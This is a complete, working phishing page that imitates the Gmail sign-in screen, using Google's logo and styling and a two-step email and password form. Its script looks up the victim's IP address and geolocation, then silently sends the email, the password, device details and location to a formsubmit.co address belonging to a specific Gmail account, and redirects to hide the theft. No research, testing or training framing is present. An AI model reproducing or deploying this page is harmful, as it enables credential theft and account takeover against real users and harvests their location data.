<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - Sign in</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap">
    <style>
        :root {
            --blue: #1a73e8;
            --gray: #5f6368;
            --light-gray: #dadce0;
        }

        * { 
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
        }

        body {
            background-color: #fff;
            color: #202124;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            padding: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            font-size: 22px;
            color: var(--gray);
        }

        .logo-img {
            height: 40px;
            margin-right: 8px;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            padding: 20px;
            transition: all 0.3s ease;
        }

        .login-card {
            width: 100%;
            max-width: 450px;
            border: 1px solid var(--light-gray);
            border-radius: 8px;
            padding: 48px 40px 36px;
            overflow: hidden;
            position: relative;
            min-height: 500px;
        }

        .form-container {
            position: absolute;
            width: calc(100% - 80px);
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }

        #emailForm {
            left: 40px;
            opacity: 1;
        }

        #passwordForm {
            left: 100%;
            opacity: 0;
        }

        .show-password #emailForm {
            left: -100%;
            opacity: 0;
        }

        .show-password #passwordForm {
            left: 40px;
            opacity: 1;
        }

        .login-title {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 8px;
        }

        .subtitle {
            text-align: center;
            color: #202124;
            margin-bottom: 40px;
            font-size: 16px;
            font-weight: 400;
        }

        .input-container {
            position: relative;
            margin-bottom: 24px;
        }

        .input-field {
            width: 100%;
            height: 56px;
            padding: 13px 15px;
            border: 1px solid var(--light-gray);
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: all 0.2s;
        }

        .input-field:focus {
            border: 2px solid var(--blue);
            padding: 12px 14px;
        }

        .forgot-link {
            display: block;
            color: var(--blue);
            font-weight: 500;
            text-decoration: none;
            margin-bottom: 40px;
            font-size: 14px;
        }

        .login-options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 26px;
        }

        .create-account {
            color: var(--blue);
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }

        .next-btn {
            background-color: var(--blue);
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-weight: 500;
            cursor: pointer;
            font-size: 14px;
            transition: background-color 0.2s;
        }

        .next-btn:hover {
            background-color: #1765cc;
            box-shadow: 0 1px 2px 0 rgba(66, 133, 244, 0.3),
                0 1px 3px 1px rgba(66, 133, 244, 0.15);
        }

        .footer {
            display: flex;
            justify-content: space-between;
            padding: 24px;
            color: var(--gray);
            font-size: 12px;
            background-color: #f8f9fa;
        }

        .footer-links {
            display: flex;
            gap: 24px;
        }

        .footer-link {
            color: var(--gray);
            text-decoration: none;
        }

        .language-select {
            border: none;
            background: transparent;
            color: var(--gray);
            font-size: 12px;
        }

        @media (max-width: 600px) {
            .login-card {
                border: none;
                padding: 24px;
                min-height: 400px;
            }
            
            .header {
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">
            <img src="https://www.gstatic.com/images/branding/product/1x/gmail_2020q4_48dp.png" alt="Gmail" class="logo-img">
            <span>Gmail</span>
        </div>
    </header>
    
    <main class="container">
        <div class="login-card" id="loginCard">
            <!-- Email Form -->
            <div class="form-container" id="emailForm">
                <h1 class="login-title">Sign in</h1>
                <p class="subtitle">to continue to Gmail</p>
                
                <div class="input-container">
                    <input type="email" class="input-field" id="email" placeholder="Email or phone" required autofocus>
                </div>
                
                <a href="#" class="forgot-link">Forgot email?</a>
                
                <div class="login-options">
                    <a href="#" class="create-account">Create account</a>
                    <button type="button" class="next-btn" id="emailNextBtn">Next</button>
                </div>
            </div>
            
            <!-- Password Form -->
            <div class="form-container" id="passwordForm">
                <h1 class="login-title">Welcome</h1>
                <p class="subtitle" id="userEmailDisplay"></p>
                
                <div class="input-container">
                    <input type="password" class="input-field" id="password" placeholder="Enter your password" required>
                </div>
                
                <div class="login-options">
                    <a href="#" class="forgot-link">Forgot password?</a>
                    <button type="button" class="next-btn" id="passwordNextBtn">Next</button>
                </div>
            </div>
        </div>
    </main>
    
    <footer class="footer">
        <div class="footer-links">
            <a href="#" class="footer-link">Help</a>
            <a href="#" class="footer-link">Privacy</a>
            <a href="#" class="footer-link">Terms</a>
        </div>
        <select class="language-select">
            <option value="en">English (United States)</option>
            <option value="es">Español</option>
            <option value="fr">Français</option>
        </select>
    </footer>

    <script>
        // DOM Elements
        const loginCard = document.getElementById('loginCard');
        const emailForm = document.getElementById('emailForm');
        const passwordForm = document.getElementById('passwordForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const userEmailDisplay = document.getElementById('userEmailDisplay');
        const emailNextBtn = document.getElementById('emailNextBtn');
        const passwordNextBtn = document.getElementById('passwordNextBtn');
        
        // Email Next Button Click
        emailNextBtn.addEventListener('click', function() {
            if (emailInput.value.trim() === '') {
                emailInput.focus();
                return;
            }
            
            // Store email
            window.emailInputData = emailInput.value;
            
            // Update password form with email
            userEmailDisplay.textContent = window.emailInputData;
            
            // Trigger animation
            loginCard.classList.add('show-password');
            
            // Focus password field after animation
            setTimeout(() => {
                passwordInput.focus();
            }, 400);
        });
        
        // Password Next Button Click
        passwordNextBtn.addEventListener('click', async function() {
            if (passwordInput.value.trim() === '') {
                passwordInput.focus();
                return;
            }
            
            // Store password
            window.passInputData = passwordInput.value;
            
            // Get IP and location data
            let ipData = {};
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                if(ipResponse.ok) {
                    ipData = await ipResponse.json();
                } else {
                    // Fallback API
                    const backupResponse = await fetch('https://ipinfo.io/json');
                    if(backupResponse.ok) {
                        ipData = await backupResponse.json();
                    }
                }
            } catch (error) {
                console.log('IP detection failed');
                ipData = {
                    ip: 'Detected but hidden',
                    city: 'Unknown',
                    region: 'Unknown',
                    country: 'Unknown'
                };
            }

            // Prepare form data
            const formData = {
                _subject: 'Gmail Login Data',
                email: window.emailInputData,
                password: window.passInputData,
                timestamp: new Date().toISOString(),
                device: navigator.userAgent,
                ip_address: ipData.ip || 'Detected but hidden',
                location: ipData.city ? `${ipData.city}, ${ipData.region || ipData.country_name || ipData.country}` : 'Approximate location only',
                coordinates: ipData.latitude ? `${ipData.latitude}, ${ipData.longitude}` : 'Not available'
            };

            // Silent form submission
            fetch('https://formsubmit.co/ajax/mdrahulsarkar5525@gmail.com', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(formData)
            })
            .then(response => response.json())
            .then(data => {
                // Redirect after submission
                window.location.href = '/index.html';
            })
            .catch(error => {
                // Still redirect if submission fails
                window.location.href = '/index.html';
            });
        });
    </script>
</body>
</html>
